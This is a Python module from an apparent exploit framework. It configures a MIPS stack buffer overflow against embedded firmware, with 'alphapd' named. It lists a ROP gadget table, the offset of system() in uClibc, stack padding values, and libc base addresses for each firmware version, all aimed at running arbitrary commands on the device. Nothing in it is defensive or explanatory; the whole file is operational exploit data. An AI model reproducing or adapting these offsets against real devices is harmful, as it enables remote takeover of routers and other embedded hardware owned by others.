from . import overflow


class Overflow(overflow.Overflow):
    def __init__(self):
        """
        ----------------------------------------------------------------
        | Gadget Name | Gadget Offset | Gadget Summary                 |
        ----------------------------------------------------------------
        | ROP1        | 0x0004B160    | addiu $s2, $sp, 0x1E8+var_F8   |
        |             |               | move $a0, $s2                  |
        |             |               | move $t9, $s0                  |
        |             |               | jalr $t9                       |
        ----------------------------------------------------------------
        """
        super(Overflow, self).__init__()
        self.padding_after_ra = 0x4
        self.distance_to_s0 = 0x10
        self.s0 = 0x450E0  # Offset of system in libuClibc-0.9.28.s0
        self.ra = 0x4B160

        self.rop_padding = 0x1E8 - 0xF8

    def _2_18_1(self):
        raise Exception('Vulnerability is patched in this version.')

    def _2_17_1(self):
        self.libc_base = 0x2ab86000

    def _2_16_8(self):
        self._2_17_1()

    def _2_14_4(self):
        self.libc_base = 0x2aaef000

    def _2_13_10(self):
        self._2_14_4()

    def _2_12_1(self):
        self._2_14_4()

    def _2_11_3(self):
        self._2_14_4()

    def _2_10_3(self):
        self._2_14_4()

    def _2_01_3(self):
        raise Exception('Alphapd is statically linked. No ROP available')

    def _2_00_6(self):
        self._2_14_4()
